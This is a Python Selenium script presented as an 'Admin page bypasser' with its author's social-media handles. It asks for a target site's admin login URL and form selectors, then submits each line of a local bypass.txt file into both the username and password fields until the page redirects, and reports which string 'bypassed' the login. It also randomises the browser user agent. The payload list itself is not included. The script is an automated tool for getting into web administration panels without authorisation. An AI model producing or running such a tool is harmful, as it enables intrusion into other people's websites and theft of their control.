from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
print('\x1bc')
banner = """
    _       _           _                                
   / \   __| |_ __ ___ (_)_ __    _ __   __ _  __ _  ___ 
  / _ \ / _` | '_ ` _ \| | '_ \  | '_ \ / _` |/ _` |/ _ \
 / ___ \ (_| | | | | | | | | | | | |_) | (_| | (_| |  __/
/_/   \_\__,_|_| |_| |_|_|_| |_| | .__/ \__,_|\__, |\___|
                                 |_|          |___/      
 _                                           _             _ _____ _____ ____  
| |__  _   _ _ __   __ _ ___ ___  ___ _ __  | |__  _   _  / |_   _| ____|  _ \ 
| '_ \| | | | '_ \ / _` / __/ __|/ _ \ '__| | '_ \| | | | | | | | |  _| | | | |
| |_) | |_| | |_) | (_| \__ \__ \  __/ |    | |_) | |_| | | | | | | |___| |_| |
|_.__/ \__, | .__/ \__,_|___/___/\___|_|    |_.__/ \__, | |_| |_| |_____|____/ 
       |___/|_|                                    |___/                       
telegram : @king_1ted
instagram : @_.1ted._
"""
print(banner)
address = input("Enter Target Admin page Login location (exmp : https://exam.pl/admin/login.php) :  ")
username_input_css = input("Enter Username Input Css Location :  ")
password_input_css = input("Enter Password Input Css Location :  ")
login_link_css = input("Enter Login button Css Location :  ")
loc = input("Enter your Chrom driver location (exmp : ~/Desktop/chromdriver Or C:\\users\\you\\Desktop\\chromedriver.exe) : ")
options = Options()
options.add_argument("window-size=400,600")
ua = UserAgent()
user_agent = ua.random
options.add_argument(f'user-agent={user_agent}')
chrome_options = webdriver.ChromeOptions()
prefs = {"profile.managed_default_content_settings.images": 2}
chrome_options.add_experimental_option("prefs", prefs)
browser = webdriver.Chrome(loc ,chrome_options=chrome_options)
#For Enable show image
#browser = webdriver.Chrome(loc)
browser.implicitly_wait(5)
#Bypass file
bypass = "bypass.txt"
seda = open(bypass, "r")
readed = seda.read()
readed = readed.split("\n")
browser.get(address)
Bypassed = False
for i in range(len(readed)) :
    if browser.current_url != address :
        Bypassed = True
        break
    else:
        key = readed[i]
        browser.get(address)
        username_input = browser.find_element_by_css_selector(username_input_css)
        password_input = browser.find_element_by_css_selector(password_input_css)
        username_input.send_keys(key)
        password_input.send_keys(key)
        login_button = browser.find_element_by_css_selector(login_link_css)
        login_button.click()
if (Bypassed):
    print('\x1bc')
    print(banner)
    print("-> Bypassed By : " + key)
else:
    print('\x1bc')
    print(banner)
    print("We Can't Bypass this :(")